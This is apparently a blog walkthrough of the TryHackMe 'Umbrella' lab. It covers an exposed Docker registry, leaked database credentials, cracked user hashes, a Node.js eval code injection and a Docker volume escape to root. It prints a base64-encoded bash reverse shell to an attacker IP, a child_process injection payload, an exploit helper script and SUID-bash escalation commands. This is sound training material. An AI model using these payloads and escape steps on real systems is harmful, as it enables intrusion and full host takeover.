---
layout: post
title: Umbrella - TryHackMe
categories:
- TryHackMe
tags:
- linux
- docker registry
- docker
- code injection
- volumes
- mysql
date: 2024-01-22
description: Breach Umbrella Corp's time-tracking server by exploiting misconfigurations around containerization. Link - <https://tryhackme.com/room/umbrella>
summary: Breach Umbrella Corp's time-tracking server by exploiting misconfigurations around containerization. Link - <https://tryhackme.com/room/umbrella>
cover:
  image: images/machine_img.png
---

## Recon

```shell
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f0142fd6f6768c589a8e846ab1fbb99f (RSA)
|   256 8a52f1d6ea6d18b26f26ca8987c9496d (ECDSA)
|_  256 4b0d622a795ca07bc4f46c763c227ff9 (ED25519)
3306/tcp filtered mysql
5000/tcp filtered upnp
8080/tcp filtered http-proxy

```

First lets configure hosts file: `echo "10.10.90.68 umbrella.thm" |  sudo tee -a /etc/hosts`

The target machine has 4 ports/services:

- SSH service on port 22
- MYSQL database on port 3306
- UPNP(Universal Plug and play) on port 5000
- web app on port 8080

We do not have credentials for the services: SSH, MYSQL and Web app login.
Running gobuster and nikto in the web app on port 8080 we do not find nothing.

## Exposed Docker Registry

Lets see what we can do with UPNP service on port 5000 detected by nmap.
By running nikto we found the following: `Uncommon header 'docker-distribution-api-version' found, with contents: registry/2.0`
It seems like a docker registry is running here. Requesting the url `http://10.10.247.66:5000/v2/_catalog` to list the docker images present in the registry we get one: `umbrella/timetracking`

There are two ways of getting information from the image:

- Method 1: Pull the image from the registry and run it in our local docker.
- Method 2: Extract the tags from the docker image and the following manifest and blobs.

### Method 1 - Pull and Run

To use the image we need to pull it from the registry first, however since the registry is using http, we need to add a configuration to our docker to pull from insecure registries:

- Add the following to /etc/docker/daemon.json:

```json
{
   "insecure-registries": [
      "umbrella.thm:5000"
    ]
}

```

- Then restart docker:

```shell
sudo systemctl daemon-reload
sudo systemctl restart docker
```

- See if it made changes: `docker info`

![](/images/umbrella/docker_insecure.png)

- Pull the image using the command: `docker pull 10.10.247.66:5000/umbrella/timetracking`
- Run image and get a shell inside `docker run -it --entrypoint sh  10.10.247.66:5000/umbrella/timetracking`

**Note:**

- We can analyze the different layers using a tool call [dive](https://github.com/wagoodman/dive): `dive 10.10.247.66:5000/umbrella/timetracking`

We notice a app.js. By extracting the source code, we know that we are dealing with the service running on port 8080.
Using printenv we get the environment variables and mysql credentials:

```shell
# printenv
NODE_VERSION=19.3.0
HOSTNAME=1a927e523fdc
YARN_VERSION=1.22.19
HOME=/root
OLDPWD=/usr/src/app
DB_DATABASE=timetracking
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5
LOG_FILE=/logs/tt.log
PWD=/usr/src/app/views
DB_HOST=db
DB_USER=root

```

the file `/etc/passwd` get us the user `node`:

```shell
# cat /etc/passwd  
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash

```

### Method 2 - Manifest and Blobs

Get all the tags: `curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/tags/list`

Once we get the "latest" tag we can start extracting the manifest and blobs.

- **Manifest** of a docker image describes the layers inside an image.
- **Blobs** refer to binary large objects, which are essentially the individual layers that compose a Docker image.

By looking at the manifest `curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/manifests/latest` we can see the environment variables being set:

![](/images/umbrella/envs.png)

## Foothold

After obtaining the credentials. lets connect to the mysql database: `mysql -u root -D timetracking -h 10.10.247.66 -p'Ng1-f3!Pe7-e5?Nf3xe5'`
We have table users with the following users:

```shell
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 | Password1
| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 | letmein
| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 | sunshine1
| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 | sandwich
+----------+----------------------------------+-------+
```

The first user gave us access to the machine using SSH: `ssh claire-r@10.10.247.66`. We get the user.txt flag!

## Privilege Escalation

In the claire-r user home directory, we have the source code of the application and the volume of the application is mounted under the `logs` directory.
Looking at the ownership we notice that we are the owners so if we can get a shell as root in the docker container running the application we can mount the bash binary with SUID and get root in the main machine. For more information check hacktricks in [this](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells-and-host-mount) subject.

Lets try to find a way to get a shell in the docker container.
Analyzing the source code with snyk it identifies a **Code Injection** vulnerability at line 83.

Lets find out how can we exploit it!
By catching the request with burpsuite and sending it to repeater we can try different payloads. useful payloads can be found [here](https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet).

After tryng a couple of code execution payloads using burpsuite the session was always going down and we had to login again.
To help with this, we have developed a script "exploit.py" that initiates a session and asks for the exploit.

```python
import requests

url = "http://umbrella.thm:8080"

# Get request for connect.sid cookie
endpoint = "/"
session = requests.Session()
response = session.get(url+endpoint)
print(session.cookies.get_dict())


# Post request for login
endpoint = "/auth"
payload = {
    'username': 'claire-r',
    'password': 'Password1'
}
response = session.post(url+endpoint, data=payload) 
print(session.cookies.get_dict())

# Ask for exploit
exploit = input('Exploit?\n') 
print(exploit)

# Post exploit
endpoint = "/time"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://umbrella.thm:8080/",
    "Content-Type": "application/x-www-form-urlencoded"
}

payload = {
    'time': exploit
}
response = session.post(url+endpoint, headers=headers, data=payload, stream=True) 
for chunk in response.iter_content(chunk_size=10 * 1024):
    print(chunk)
```

We used the following exploit:

```shell
nc -lvnp 4242
echo "bash -i >& /dev/tcp/10.8.165.253/4242 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE2NS4yNTMvNDI0MiAwPiYxCg==

echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE2NS4yNTMvNDI0MiAwPiYxCg==" | base64 -d | bash

Final exploit: arguments[1].end(require('child_process').execSync('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE2NS4yNTMvNDI0MiAwPiYxCg==" | base64 -d | bash'))

```

![](/images/umbrella/exploited.png)

Once we get a shell inside the docker we notice that we are root.
This was the final piece to exploit the flaw in the misconfigured docker volume.
In order to gain root in the actual machine we run the following commands:

```shell
cp /bin/bash ~/timeTracker-src/logs #Machine as claire-r
chown root:root bash #container as root
chmod 4777 bash #container as root
~/timeTracker-src/logs/bash -p #Machine as claire-r 
```

What is done here is making a copy of the bash binary and and give it SUID.
Since the user in the container(root) applies the modifications to the files with his id(0), we are essentially root in that specific directory that is mounted in docker.

## Flaws

- Docker registry exposed without authentication
- Environment variables with hardcoded credentials
- Eval() function without sanitization
- Web application running as root inside docker container
- Mounted volume with read/write access to a non privileged user
